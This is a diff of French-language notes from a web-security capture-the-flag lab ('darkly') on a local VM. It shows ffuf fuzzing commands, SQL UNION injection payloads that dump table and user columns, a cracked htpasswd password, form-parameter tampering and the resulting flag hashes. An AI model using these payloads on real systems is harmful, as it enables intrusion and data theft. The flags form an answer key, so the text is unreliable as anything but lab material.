@@ -19,36 +19,44 @@ Remplacons le cookie
 
 * Search image :
 
-vulnerable a l'injection sql
-sqlmap --batch --dump -u <curl requete> --level=5 --risk=3 --technique=BEU
-echo 1928e8083cf461a51303633093573c46 | sha2
+ffuf -w payload.txt:FUZZ -u "http://192.168.56.103/?page=searchimg&id=FUZZ&Submit=Submit#" -fs 2410
+5 UNION SELECT table_schema,table_name FROM information_schema.columns
+5 UNION SELECT table_name,column_name FROM information_schema.columns
+5 UNION SELECT title,comment FROM list_images
+echo 'albatroz' | sha2
 ~flag - fe0ca5dd7978ae1baae2c1c19d49fbfbb37fe7905b9ad386cbbb8206c8422de6~
 
 * Search users :
-injection sql comme image
-
-echo 5ff9d0165b4f92b14994e5c685cdce28 | sha2
+for ((i=0;i<1000;i++)) ; do echo $i >> payload.txt; done
+ffuf -w payload.txt:FUZZ -u "http://192.168.56.103/?page=member&id=FUZZ&Submit=Submit#" -fs 2462
+1 OR 1
+5 UNION SELECT database(),2
+5 UNION SELECT table_schema,table_name FROM information_schema.columns
+5 UNION SELECT table_name,column_name FROM information_schema.columns
+5 UNION SELECT user_id,planet FROM users
+5 UNION SELECT user_id,countersign FROM users
+5 UNION SELECT user_id,commentaire FROM users
+echo 'fortytwo' | sha2
 ~flag - 3b4e8a30ecbfde518f50f2bda1912b40338ecd71821faeb1e9cdf44cefff95f5~
 
-* Source page :
+* GSource page :
 ?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c
 
 * Login :
-~admin - shadow = b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2~
-root - shadow =
-b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
+admin - shadow
+~flag - b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2~
 
 * Fuzzing :
 
 url/whatever - htpasswd http://192.168.56.102/whatever/htpasswdd
 root:8621ffdbc5698829397d97767ac13db3 - dragon
 go to url/admin
-~flag d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff~
+~flag - d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff~
 
 * Member survey :
 
 modifier les parametres post dans le browser en mettant 42
-~flag 03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa~
+~flag - 03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa~
 
 
 
@@ -104,16 +112,6 @@ Table: vote_dbs
 
 
 λ ~/gitlab/darkly/ main* ffuf -w ~/tmp/directory-list-2.3-medium.txt -u 'http://192.168.56.102/FUZZ'
-
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
-
-       v1.3.1-dev
-________________________________________________
 
  :: Method           : GET
  :: URL              : http://192.168.56.102/FUZZ
